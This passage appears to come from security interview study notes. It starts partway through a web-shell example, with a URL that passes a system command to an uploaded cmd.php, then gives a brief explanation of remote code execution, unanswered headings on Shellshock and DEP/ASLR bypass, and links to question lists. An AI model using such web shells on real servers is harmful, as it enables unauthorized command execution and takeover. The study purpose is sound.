If this worked properly, we should now be able to access our shell via URL and by supplying a system command as a parameter.

`domain/path/cmd.php?cmd=whoami`

### Describe Remote Command Execution (RCE)

Remote code execution is a major security lapse, and the last step along the road to complete system takeover. After gaining access, an attacker will attempt to escalate their privileges on the server, install malicious scripts, or make your server part of a botnet to be used at a later date.

### How do you exploit the Shellshock vulnerability and what can an attacker do with it?

### How would you bypass DEP or ASLR

### Switch vs Router

### More Q&A from GitHb

### Simmetric key algorithm and Key lenght

https://danielmiessler.com/study/infosec_interview_questions/

https://github.com/justinltodd/security-interview-questions

https://github.com/DopplerHQ/awesome-interview-questions

https://github.com/gracenolan/Notes/blob/master/interview-study-notes-for-security-engineering.md
